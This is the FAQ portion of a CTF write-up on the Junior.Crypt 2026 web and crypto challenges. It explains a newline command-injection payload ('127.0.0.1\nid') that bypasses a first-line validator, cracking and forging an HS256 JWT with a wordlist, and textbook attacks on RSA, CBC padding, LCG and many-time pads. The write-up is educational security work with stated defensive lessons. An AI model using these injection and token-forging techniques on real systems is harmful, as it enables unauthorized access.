## Frequently asked questions[#](#frequently-asked-questions)

### What is Junior.Crypt 2026?[#](#what-is-juniorcrypt-2026)

Junior.Crypt is a Belarusian junior-tier CTF (hosted in Grodno; flag prefix `grodno{...}`). The 2026 edition ran categories including crypto, forensic, misc, osint, pwn, reverse, and web. This writeup covers the two web challenges (Pulse, Wrodle) and five crypto challenges (MeowMeow, Neurotoxin Diagnostics, Still Alive, Stream Calibration, Weighted Companion Cube) I solved. The paired pwn + reverse writeup is at [Junior.Crypt 2026 pwn + reverse writeup](https://cybersecurityelite.com/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/). Per-challenge READMEs, handouts, and pure-stdlib Python solvers are mirrored at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF).

### How does Pulse’s newline injection bypass the character validator?[#](#how-does-pulses-newline-injection-bypass-the-character-validator)

The PHP source runs `preg_match('/\A[a-z0-9.-]+\z/i', $previewTarget)` where `$previewTarget = explode("\n", str_replace("\r", '', $targets), 2)[0]`, which is only the first line of the multi-line input. But the `shell_exec` call concatenates `$targets` (the full multi-line buffer) into `timeout 4 ping -c 1 -W 1 <targets> 2>&1`. POSIX shells treat `\n` as a command separator identically to `;`. Payload `127.0.0.1\nid` passes validation (first line is `127.0.0.1`, matches the regex) and executes `ping -c 1 -W 1 127.0.0.1` followed by `id`. The bug is a validation/usage mismatch: the validator sees the first line but the shell sees the whole buffer.

### How do you crack the Wrodle HS256 secret?[#](#how-do-you-crack-the-wrodle-hs256-secret)

Wrodle uses `HS256` with the secret embedded in the server. HS256 signature verification is HMAC-SHA256 comparison against `base64url(header) + "." + base64url(payload)`, so cracking is just running an HMAC checker over a wordlist. `SecLists/Passwords/scraped-JWT-secrets.txt` contains `butterfly` at position 4869. Once cracked, any payload can be signed, including `current_word: 51` to skip the 50-round game and reach `/api/finish`, which returns a coordinate-encoded flag hint. Then forge per-word tokens with `attempts: 0` and use `/api/guess` as a Wordle oracle to solve the 10 coordinate words.

### Why does the MeowMeow RSA challenge have only 604,800 possible seeds?[#](#why-does-the-meowmeow-rsa-challenge-have-only-604800-possible-seeds)

The generator seeds from a Unix timestamp in the range 2026-06-20 00:00:00 UTC to 2026-06-26 23:59:59 UTC = one week × 24 hours × 60 minutes × 60 seconds = 604,800 possible integer seeds. Each seed determines the full SplitMix64 state → 12 pseudo-random 64-bit words → `p_base` and `q_base` → `p = next_prime(p_base)`, `q = next_prime(q_base)`. Since prime gaps around 384-bit values are tiny compared to the modulus, `abs(n - p_base * q_base)` is small for the correct seed and enormous for random seeds. A threshold of `2^430` cleanly separates the true seed; the hit is `1782240431` (2026-06-23 18:47:11 UTC).

### What is the Vaudenay CBC padding oracle attack and how does the timing trace enable it?[#](#what-is-the-vaudenay-cbc-padding-oracle-attack-and-how-does-the-timing-trace-enable-it)

Vaudenay (Eurocrypt 2002) showed that any CBC decrypter that leaks whether PKCS#7 padding was valid after decryption can be turned into a plaintext-recovery oracle. Manipulate the previous ciphertext block `C_{i-1}`, submit `C'_{i-1} || C_i`, and observe whether padding is valid. The winning byte gives one byte of the intermediate state `J_i = AES_dec(C_i)`; iterate over 16 positions per block. Plaintext = `J_i XOR C_{i-1}` using the original ciphertext. Neurotoxin’s timing trace is a recording of exactly that iteration: 98,304 records = 8 blocks × 16 pad positions × 256 guesses × 3 trials, with `elapsed_ns` measurements. Valid padding takes ~2.4× longer than invalid; taking `min(elapsed_ns over 3 trials)` per (block, pad, guess) and `argmax over 256 guesses` picks the winner with a ~14σ margin.

### Why does Franklin-Reiter work against Still Alive?[#](#why-does-franklin-reiter-work-against-still-alive)

Franklin-Reiter (1996) attacks RSA when two ciphertexts encode plaintexts related by a known low-degree polynomial `f`. With `c₁ = m^e mod n` and `c₂ = f(m)^e mod n`, both `m` and `m` (the same value) are roots of `g₁(x) = x^e - c₁ mod n` and `g₂(x) = f(x)^e - c₂ mod n`. `(x - m)` divides `gcd(g₁, g₂)` in `Z_n[x]`. When `e · deg(f) · (e·deg(f)+1)/2 < log₂(n)`, i.e. the polynomial degrees are small compared to log n, the gcd collapses to a linear polynomial and `m` is its constant term (up to leading-coefficient inversion). Here `e = 3`, `deg(f) = 1`, so `3 · 1 · 4/2 = 6 < 2047 = log₂ n`. Bonus: because `m < n^(1/3)` (since `m` is ~438 bits and `n^(1/3)` is ~682 bits), a direct integer cube root of `c₁` also gives `m` without any polynomial work.

### Why does Stream Calibration’s 20-bit seed truncation make it trivially breakable?[#](#why-does-stream-calibrations-20-bit-seed-truncation-make-it-trivially-breakable)

The encoder computes `state = seed & 0xFFFFF` before the LCG loop runs, so only the low 20 bits of the seed reach the internal state. Whatever value the caller passes, at most `2^20 = 1,048,576` distinct keystreams can be produced. For a 124-byte ciphertext, brute-forcing all seeds and searching for `b"grodno{"` in the XOR-decrypted plaintext runs in a few seconds in straight-line Python. Seed `0x5a17c` (369,020) yields the plaintext. The Numerical Recipes LCG constants (`1664525 / 1013904223 / 2^32`) are diagnostic (one of the most recognisable non-crypto PRNGs), but the LCG itself isn’t the bug; the seed truncation is.

### How does the many-time pad recovery in Weighted Companion Cube work?[#](#how-does-the-many-time-pad-recovery-in-weighted-companion-cube-work)

The template `[Aperture Archive]\nitem=<18>\nstatus=<12>\nsector=<12>\nmemo=<64>\n` = 153 bytes with fixed literals at ~50 positions and 4 variable fields. Every ciphertext in the batch uses the same keystream. Literal positions give `K[pos] = C_i[pos] XOR literal[pos]` directly. Variable-field positions are solved by multiset match: at any byte position within a variable field, `{C_i[pos] XOR K[pos] : i in 0..5}` must equal the multiset of that byte across the 6 catalog values, regardless of which record used which catalog value. Brute-force `K ∈ 0..255` per position (256 candidates), 153 positions total. One ambiguous position (memo[33]) with two candidates is resolved by the flag alphabet constraint.

### What is the ambiguous byte in Weighted Companion Cube and how do you resolve it?[#](#what-is-the-ambiguous-byte-in-weighted-companion-cube-and-how-do-you-resolve-it)

At memo[33] (absolute position 121), the catalog byte multiset is `{m, n, e, i, b, a}` = `{0x6d, 0x6e, 0x65, 0x69, 0x62, 0x61}`. This multiset is closed under XOR-with-12: `'a' XOR 0x0c = 'm'`, `'b' XOR 0x0c = 'n'`, `'e' XOR 0x0c = 'i'`. Two keystream candidates 12 apart (`K = 38` and `K = 42`) both permute the multiset to itself, so the multiset test can’t distinguish them. The tiebreaker: the flag alphabet only contains `[A-Za-z0-9_{}]`. `K = 38` gives `'='` at that position (outside the alphabet); `K = 42` gives `'1'` (inside). Pick `K = 42`, decoding to `..._57r1c7ly_4_...` = leetspeak for “strictly.”

### Why do all the crypto flag payloads read like the vulnerability description?[#](#why-do-all-the-crypto-flag-payloads-read-like-the-vulnerability-description)

Deliberate design by the challenge author. Each flag payload is a leetspeak sentence naming the attack class:

* `571ll_4l1v3_bu7_g14d05_k3375_r3w5171ng_m35s4g35` = “still alive but GLaDOS keeps rewriting messages” (Franklin-Reiter’s setting: same plaintext rewritten under a known transform).
* `7h15_w45_4_7r1umph_bu7_7h3_533d_w45_700_5m4ll` = “this was a triumph but the seed was too small” (LCG seed truncation; also the opening line of *Still Alive*, the Portal end-credits song).
* `c0mp4n10n_cub3_7h15_15_57r1c7ly_4_m4ny_71m3_p4d` = “companion cube this is strictly a many-time pad.”
* `n3ur070x1n_d14gn0571c5_l34k_7hr0ugh_71m1ng_4l0n3` = “neurotoxin diagnostics leak through timing alone.”

Reading the flag on your first pop should feel like the writeup has already been written. The author’s convention: name the attack class in the flag; use Portal/Aperture Science flavour for the framing but keep the crypto lesson honest.

### What’s the broader lesson from the Junior.Crypt 2026 web + crypto tracks?[#](#whats-the-broader-lesson-from-the-juniorcrypt-2026-web--crypto-tracks)

Every challenge in the crypto track is a textbook attack in a Portal-flavoured wrapper: SplitMix64 timestamp-seeded RSA (fast key exhaustion), Vaudenay CBC (via timing, not error message), Franklin-Reiter e=3 (with a chosen `a`, `b`), 20-bit LCG (brute force), many-time pad (multiset match). Recognise the primitive by the metadata note and the flag payload before touching the code. Every challenge in the web track is a validator/sink mismatch: Pulse validates the first line but executes the full buffer; Wrodle signs game state with a wordlist secret. Match validation to sink byte-for-byte, and never sign client-round-trippable state with a human-word secret. Modern equivalents of every bug here have shipped in production this decade: Franklin-Reiter has real-world analogues in signature-scheme mistakes; MTP shows up in poorly-designed session cookies; padding oracles show up in every legacy protocol.

### Where can I find the solver scripts?[#](#where-can-i-find-the-solver-scripts)

Per-challenge READMEs, handouts, and pure-stdlib Python solvers are at [Abdelkad3r/Junior.Crypt.2026-CTF](https://github.com/Abdelkad3r/Junior.Crypt.2026-CTF). Each challenge has a `solve.py` that reproduces the flag against a fresh instance (web) or from the handout (crypto). All solvers use only the Python standard library (no PyCryptodome, no gmpy2, no Sage). Python 3.8+ (for `pow(x, -1, n)`) is sufficient.

## Closing notes[#](#closing-notes)

Seven challenges, seven textbook attacks dressed in a small game or an Aperture Science memo. Pulse and Wrodle collapse when you notice that validators and sinks disagree on what “the input” is (first line vs whole buffer, client vs server state). The crypto track’s five challenges name their own attack class in the flag payload: Franklin-Reiter, LCG seed truncation, many-time pad, Vaudenay through timing, SplitMix64 timestamp-seeded key generation. The general defensive lesson is that every one of these bug classes has a well-known modern replacement (OAEP + PSS instead of textbook RSA, AEAD instead of CBC without MAC, CSPRNG-seeded keys, per-record nonces, HMAC with random 256-bit secrets), and the industry keeps ignoring at least one of them per year at scale.

For more crypto and web content on this site, the paired [Junior.Crypt 2026 pwn + reverse writeup](https://cybersecurityelite.com/ctf-writeups/junior-crypt-2026-pwn-reverse-writeup/) walks the other four challenges from the same event (Clockwork Vault negative-index bug, House of Mirage session-to-sink UAF, Museum of Echoes reclassify-without-realloc, Write The “Кодэ” modified-TCC-compiler VM). The [NoHackNoCTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/nohacknoctf-2026-writeup/) covers AES-CTR keystream reuse (same class as Companion Cube’s MTP) and ECDSA nonce-prefix HNP. The [R3CTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/r3ctf-2026-writeup/) has HEuristic (Microsoft SEAL CKKS delta recovery), mafuyuuuuu (.NET xoshiro256\*\* state recovery), and r3ticket (Lagrange-basis oracle abuse). The [SEKAI CTF 2026 master writeup](https://cybersecurityelite.com/ctf-writeups/sekai-ctf-2026-writeup/) walks oneline6ryp7o (single-assertion crypto puzzle) and Migurimental (Next.js triple-bug). The [LYKNCTF web writeup](https://cybersecurityelite.com/ctf-writeups/lyknctf-2026-web-writeup/) covers a Legacy Profile Importer AES-CBC padding oracle (CBC-R) that structurally rhymes with Neurotoxin Diagnostics here. Full [CTF writeups index](https://cybersecurityelite.com/ctf-writeups/) for everything else.

### Join the CyberSecurity Elite newsletter

Weekly writeups, tools, and tactics — straight to your inbox. No spam, unsubscribe anytime.

Email address

Subscribe